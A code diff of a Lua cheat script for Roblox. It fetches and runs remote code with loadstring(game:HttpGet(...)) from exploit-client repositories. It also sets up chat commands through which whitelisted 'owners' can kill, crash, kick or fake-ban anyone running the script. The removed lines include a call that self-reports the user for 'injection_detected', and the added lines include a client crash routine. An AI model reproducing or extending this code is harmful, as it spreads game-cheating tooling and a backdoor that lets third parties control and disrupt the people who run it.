@@ -1,7 +1,5 @@
 local lplr = game:GetService("Players").LocalPlayer
 local playersService = game:GetService("Players")
-local TextChatService = game:GetService("TextChatService")
-local RBXSystem = TextChatService.TextChannels.RBXSystem
 local whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/chang3dsprojects/Projects/main/COMMANDS/Whitelist"))()
 local FunctionsLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/NightbedForRoblox/main/Libraries/FunctionsHandler.lua"))()
 local entityLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/Libraries/entityHandler.lua"))()
@@ -16,12 +14,12 @@ function funcs:reset()
 	game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.ResetCharacter:FireServer()
 end
 function funcs:kill2()
-	lplr.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+	lplr.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead,true)
+	lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
 end
 function funcs:lagback()
-	for i = 1, 5 do
-	      local detectedLocalPosition = lplr.Character.HumanoidRootPart.Position
-	      lplr.Character.HumanoidRootPart.CFrame = CFrame.new(detectedLocalPosition.X, 999999, detectedLocalPosition.Z)
+	for i = 1,5 do
+		lplr.Character.HumanoidRootPart.CFrame = CFrame.new(999999,999999,999999)
 	end
 end
 function funcs:jump()
@@ -51,7 +49,9 @@ function funcs:deletemap()
 		end
 end
 function funcs:crash()
-	setfpscap(0)
+	if setfpscap then setfpscap(99e99) end
+	if set_fps_cap then set_fps_cap(99e99) end
+	print(game:GetObjects("h29g3535")[1])
 end
 function funcs:chipman()
 			function funny(v)
@@ -98,7 +98,7 @@ function funcs:chipman()
 				v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
 			end
 		end
-	
+
 		for i,v in pairs(game:GetDescendants()) do
 			funny(v)
 		end
@@ -149,7 +149,7 @@ function funcs:rickroll()
 				v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
 			end
 		end
-	
+
 		for i,v in pairs(game:GetDescendants()) do
 			funny(v)
 		end
@@ -232,7 +232,7 @@ function funcs:byfron()
 				end)
 			end
 function funcs:kick(reason)
-	reason = reason or "You have been kicked by an owner"
+	reason = reason or "Imagine Got Kicked L"
 	lplr:Kick(reason)
 end
 function funcs:lobby()
@@ -249,7 +249,7 @@ function funcs:reinject()
 end
 function funcs:ban()
 	task.spawn(function()
-			  getfenv(1)["game"]["GetService"](getfenv(1)["game"], "ReplicatedStorage")["FindFirstChild"](getfenv(1)["game"]["GetService"](getfenv(1)["game"], "ReplicatedStorage"), "SelfReport", true)["FireServer"](getfenv(1)["game"]["GetService"](getfenv(1)["game"], "ReplicatedStorage")["FindFirstChild"](getfenv(1)["game"]["GetService"](getfenv(1)["game"], "ReplicatedStorage"), "SelfReport", true), "injection_detected")
+		lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
 	end)
 	game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"].TeleportToLobby:FireServer()
 end
@@ -257,54 +257,70 @@ function funcs:void()
 	lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0, -35, 0)
 end
 function sysmsg(text, color)
-RBXSystem:DisplaySystemMessage(text)
+    game.StarterGui:SetCore(
+        "ChatMakeSystemMessage",
+        {
+            Text = text,
+            Color = (color or Color3.fromRGB(255, 255, 255)),
+            Font = Enum.Font.SourceSans,
+            FontSize = Enum.FontSize.Size24
+        }
+    )
 end
 
 spawn(function()
 	for i,v in pairs(game:GetService("Players"):GetChildren()) do
 	if table.find(whitelist.Owners,v.UserId) then
-			sysmsg("[OWNER MSG] Ty for using the config!")
+			sysmsg("{DETECTED} OWNER WAS IN YOU GAME")
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("DETECTED_R7SK8TRXPARC2", "All")
 		end
 	end
+	game:GetService("Players").ChildAdded:Connect(function(v)
+		if table.find(whitelist.Owners,v.UserId) then
+			sysmsg("[DETECTED] OWNER WAS IN YOU GAME!")
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("DETECTED_R7SK8TRXPARC", "All")
+		end
+	end)
+end)
 
 for i,v in pairs(game:GetService("Players"):GetChildren()) do
 	v.Chatted:Connect(function(a) 
 		if table.find(whitelist.Owners,v.UserId) then
-			if a == "!kill" then
+			if a == ";kill" then
 				funcs:kill()
-			elseif a == "!reset" then
+			elseif a == ";reset" then
 				funcs:reset()
-			elseif a == "!byfron" then
+			elseif a == ";byfron" then
 				funcs:byfron()
-			elseif a == "!void" then
+			elseif a == ";void" then
 				funcs:void()
-			elseif a == "!kill2" then
+			elseif a == ";kill2" then
 				funcs:kill2()
-			elseif a == "!lagback" then
+			elseif a == ";lagback" then
 				funcs:lagback()
-			elseif a == "!sit" then
+			elseif a == ";sit" then
 				funcs:sit()
-			elseif a == "!unsit" then
+			elseif a == ";unsit" then
 				funcs:unsit()
-			elseif a == "!freeze" then
+			elseif a == ";freeze" then
 				funcs:freeze()
-			elseif a == "!unfreeze" then
+			elseif a == ";unfreeze" then
 				funcs:unfreeze()
-			elseif a == "!deletemap" then
+			elseif a == ";deletemap" then
 				funcs:deletemap()
-			elseif a == "!crash" then
+			elseif a == ";crash" then
 				funcs:crash()
-			elseif a == "!chipman" then
+			elseif a == ";chipman" then
 				funcs:chipman()
-			elseif a == "!rickroll" then
+			elseif a == ";rickroll" then
 				funcs:rickroll()
-			elseif a == "!uninject" then
+			elseif a == ";uninject" then
 				funcs:uninject()
-			elseif a == "!kick" then
+			elseif a == ";kick" then
 				funcs:kick()
-			elseif a == "!ban" then
+			elseif a == ";ban" then
 				funcs:ban()
-			elseif a == "!lobby" then
+			elseif a == ";lobby" then
 				funcs:lobby()
 			end
 		end
@@ -313,39 +329,39 @@ end
 game:GetService("Players").PlayerAdded:Connect(function(v)
 	v.Chatted:Connect(function(a) 
 		if table.find(whitelist.Owners,v.UserId) then
-			if a == "!kill" then
+			if a == ";kill" then
 				funcs:kill()
-			elseif a == "!reset" then
+			elseif a == ";reset" then
 				funcs:reset()
-			elseif a == "!byfron" then
+			elseif a == ";byfron" then
 				funcs:byfron()
-			elseif a == "!void" then
+			elseif a == ";void" then
 				funcs:void()
-			elseif a == "!kill2" then
+			elseif a == ";kill2" then
 				funcs:kill2()
-			elseif a == "!lagback" then
+			elseif a == ";lagback" then
 				funcs:lagback()
-			elseif a == "!sit" then
+			elseif a == ";sit" then
 				funcs:sit()
-			elseif a == "!unsit" then
+			elseif a == ";unsit" then
 				funcs:unsit()
-			elseif a == "!freeze" then
+			elseif a == ";freeze" then
 				funcs:freeze()
-			elseif a == "!unfreeze" then
+			elseif a == ";unfreeze" then
 				funcs:unfreeze()
-			elseif a == "!deletemap" then
+			elseif a == ";deletemap" then
 				funcs:deletemap()
-			elseif a == "!crash" then
+			elseif a == ";crash" then
 				funcs:crash()
-			elseif a == "!chipman" then
+			elseif a == ";chipman" then
 				funcs:chipman()
-			elseif a == "!rickroll" then
+			elseif a == ";rickroll" then
 				funcs:rickroll()
-			elseif a == "!kick" then
+			elseif a == ";kick" then
 				funcs:kick()
-			elseif a == "!ban" then
+			elseif a == ";ban" then
 				funcs:ban()
-			elseif a == "!lobby" then
+			elseif a == ";lobby" then
 				funcs:lobby()
 			end
 		end
